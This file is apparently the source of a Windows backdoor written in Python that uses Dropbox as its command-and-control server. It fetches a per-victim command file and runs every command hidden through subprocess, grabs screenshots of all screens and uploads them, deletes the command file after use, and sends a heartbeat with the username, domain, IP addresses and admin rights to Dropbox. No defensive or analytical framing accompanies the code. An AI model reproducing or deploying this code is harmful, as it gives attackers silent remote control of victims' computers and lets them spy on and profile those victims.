import dropbox
import subprocess
import os
import sys
import time
import json
import requests
import socket
import ctypes
from PIL import ImageGrab
import io

def screen():
	ss = ImageGrab.grab(all_screens=True)
	img_bytes = io.BytesIO()
	ss.save(img_bytes, format='PNG')
	dbx.files_upload(img_bytes.getvalue(), f'/{uuid}-SS.png', mode=dropbox.files.WriteMode.overwrite)

try:
	access_token = ''
	dbx = dropbox.Dropbox(access_token)
	uuid = open(os.environ['TEMP'] + "\\~.tmp").read()
except Exception as e:
	sys.exit(0)

try:
	metadata, f = dbx.files_download(f"/{uuid}-Commands.txt")	
	_raw = f.content.decode()
	cmds = _raw.split('$')
except Exception as e:
	cmds = None

if cmds:
	
	for c in cmds:

		if c == ":screen":
			try:
				screen()
				continue
			except Exception:
				pass

		try:
			subprocess.Popen(f"{c} >nul 2>&1")
		except Exception:
			pass
	
	dbx.files_delete_v2(f"/{uuid}-Commands.txt")

_r = requests.get("https://api.ipify.org")
external_ip = _r.text if _r.status_code == 200 else None
hb_data = {
	'source' : '',
	'user' : os.getlogin(),
	'computer_domain' : socket.getfqdn(),
	'ip_addr' : socket.gethostbyname(socket.gethostname()),
	'admin' : ctypes.windll.shell32.IsUserAnAdmin() != 0,
	'external_ip' : external_ip,
	'timestamp' : time.ctime()
}
dbx.files_upload(json.dumps(hb_data).encode(), f"/{uuid}-Heartbeat.txt", mode=dropbox.files.WriteMode.overwrite)